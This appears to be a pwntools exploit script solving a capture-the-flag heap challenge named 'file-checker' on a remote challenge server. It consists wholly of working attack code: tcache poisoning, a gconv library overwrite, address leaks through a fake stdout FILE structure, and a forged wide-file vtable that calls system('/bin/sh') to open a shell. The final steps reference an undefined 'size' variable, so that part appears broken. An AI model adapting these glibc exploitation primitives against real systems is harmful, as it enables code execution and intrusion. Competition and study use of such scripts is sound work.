from pwn import *
from pwn import p64, u64, p32, u32, p16, u16, p8, u8

if args.LOCAL:
    io = process('./file-checker', env={"LD_BIND_NOW":"1"})
    if args.GDB:
        cmd = """
        """
        gdb.attach(io, cmd)
else:
    io = remote("challenges.france-cybersecurity-challenge.fr", 2101)

def prepare(idx, size, filename):
    io.sendline(b'1')
    sleep(0.1)
    io.sendline(str(idx).encode())
    sleep(0.1)
    io.sendline(str(size).encode())
    sleep(0.1)
    io.sendline(filename)
    sleep(0.1)
    
def clean(idx):
    io.sendline(b'2')
    sleep(0.1)
    io.sendline(str(idx).encode())
    sleep(0.1)
    
def handle(idx, mode):
    io.sendline(b'3')
    sleep(0.1)
    io.sendline(str(idx).encode())
    sleep(0.1)
    io.sendline(str(mode).encode())
    sleep(0.1)
    
def exit():
    io.sendlineafter(b'> ', b'4')

elf = context.binary = ELF('./file-checker_patched')
libc = ELF('./libc.so.6')

sign         = 0xffffffffffd00000
pages_diff   = randint(0,2 ** 8 - 1)
page_offset  = 0x000bd0
puts_offset  = sign + ( pages_diff << 12) + page_offset

### mode[off] -> &files[0]

modes = elf.address + 0x000000000003D10
files = elf.sym.files
off = (files - modes) // 8 + 1

log.info("offset: " + hex(off))

prepare(0, 0x430-8+0x50, b'A')
prepare(1, 0x430-8+0x100, b'B')
prepare(2, 0x10, b'C')

clean(1)
clean(0)
prepare(0, 0x430+0x10+0x50, flat({0x438+0x50:p64(0x51)}))

clean(0)
clean(1)

prepare(0,0xe0+0x80+0x10-0x20- 8 - 1, b"cut")

gconv = b"w,ccs=NC_NC00-10"
prepare(0, len(gconv)+1, gconv)
prepare(1, 0x10, b'./flag.txt')

handle(1, off)

prepare(2,0x40,"A"*0x5)

map_sz = 0x21000
overwrite_lib_sz = 0xa000
prepare(2, map_sz, b'A')
clean(2)

prepare(3, map_sz+0x2000, flat({0x2000-0x10+8:map_sz+overwrite_lib_sz+2}, filler=b'\0'))
clean(2)
clean(3)

with open(f"NC_NC00-10.bin","rb") as dump:
    fake = bytearray(dump.read().replace(b"\n",b"\0"))

st_value = 0x500
puts_offset = -1

fake[st_value:st_value+8] = p64(0xffffffffffce3bd0)

prepare(4,map_sz*2+overwrite_lib_sz-0x10,\
        flat({map_sz*2+i-0x2000-0x10:fake for i in range(0x4000,overwrite_lib_sz,0x1000)},filler=b"\0"))

handle(1, off)

io.recvuntil(b'append\n')
io.recvuntil("@".encode())
heap = u64(b'@'+io.recv(5)+b'\0\0') - 0x1b40
log.info("heap " + hex(heap))

# empty bin

prepare(0, 0x20-8-1, b'A')
prepare(0, 0x20-8-1, b'A')
prepare(0, 0xe0-8-1, b'A')
prepare(0, 0xd0-8-1, b'A')
prepare(0, 0x1e0-8-1, b'A')
prepare(0, 0x410-8-1, b'A')


prepare(0, 0x420 - 8 - 1, "") 
prepare(1, 0x420 - 8 - 1, "") 
prepare(2, 0x20 - 8 - 1,"fence")
clean(1)
clean(0)
        
def link_to_tcache(target_sz):
    prepare(0,0x420*2-8-1,flat({
        0x420-8:target_sz|1,
        0x420-8+target_sz:0x20|1
        }))
    clean(1) 
    clean(0)
    
link=heap+0x32f0

def tcache_poison(sz,addr,link=heap+0x32f0):
    prepare(0,0x420*2-8-1,"") # grab unsorted chunk
    prepare(2,sz - 8 - 1,b"replaced") # will be replaced by target addr
    clean(2)
    clean(0)
    link_to_tcache(sz)
    prepare(0,0x420*2-8-1,flat({0x420: addr ^ (link >> 12)})) # fd overwrite
    clean(0)
def arbw(target_sz,target_addr,target_val,link):
    tcache_poison(target_sz,target_addr,link)
    prepare(2,target_sz - 8 - 1,"")
    prepare(2,target_sz - 8 - 1,target_val)
def align(v,n=0x10):
    return ( (v + n - 1) // n ) * n


tcache = heap+0x10

file_struct_sz = 0x1e0
chain_offset = 13 * 0x8
stderr_stdout_offset = 0xe0
stdout_n_fields = 7
alloc_sz = align(0x8 + stderr_stdout_offset + 0x8 * stdout_n_fields)
bin_target = tcache + 0x80 + 8 * (alloc_sz - 0x20) // 0x10 # 0x10 off bcz alignement

target_addr =align(bin_target-chain_offset)

def fake_stdout(target,sz,n_fields=7):
    handle = FileStructure(0)
    handle.flags = 0xfbad1800
    handle._IO_read_end = target
    handle._IO_write_base = target
    handle._IO_write_ptr = target+sz
    return bytes(handle)[:8 * n_fields]

l = 0x20


arbw(l,target_addr-0x10,flat({8:file_struct_sz},filler=b"\0",length=l-0x8-1),link) 
tcache_poison(file_struct_sz,target_addr,link=link)
prepare(2,alloc_sz+0x10-8-1,"./flag.txt") # tcache target bin count -> 1
clean(2)
prepare(2,file_struct_sz-8-1,"./flag.txt")
handle(2,1)

libc_ptr = heap+0x1cc0
stdout = fake_stdout(libc_ptr,8)
pause()
prepare(4,alloc_sz+0x10-8-1,flat({136:heap+0x4000,stderr_stdout_offset:stdout},filler=b"\0",length=alloc_sz+0x10-8-1))

io.recvuntil(b'\xb0')
libc.address = u64(b'\xb0'+io.recv(5)+b'\0\0') - 0x3fdab0
log.info("libc "+hex(libc.address))

fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
stdout = libc.sym['_IO_2_1_stdout_']
stdout_lock = libc.address + 0x205710
gadget = 0x00000000001724e0

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# pause()

prepare(0, 0x300-8-1, b'A')

prepare(0, 0x420 - 8 - 1, "") 
prepare(1, 0x420 - 8 - 1, "") 
prepare(2, 0x20 - 8 - 1,"fence")
clean(1)
clean(0)

tcache_poison(0xf0, libc.sym['_IO_2_1_stdout_'],link=heap+0x4160)

prepare(0, 0xf0 - 8 - 1, "") 

print(len(bytes(fake)))
pause()
io.sendline(b'1')
pause()
io.sendline(str(0xf0 - 8 - 1).encode())
pause()
io.sendline(str(size).encode())
pause()
io.sendline(bytes(fake))

io.interactive()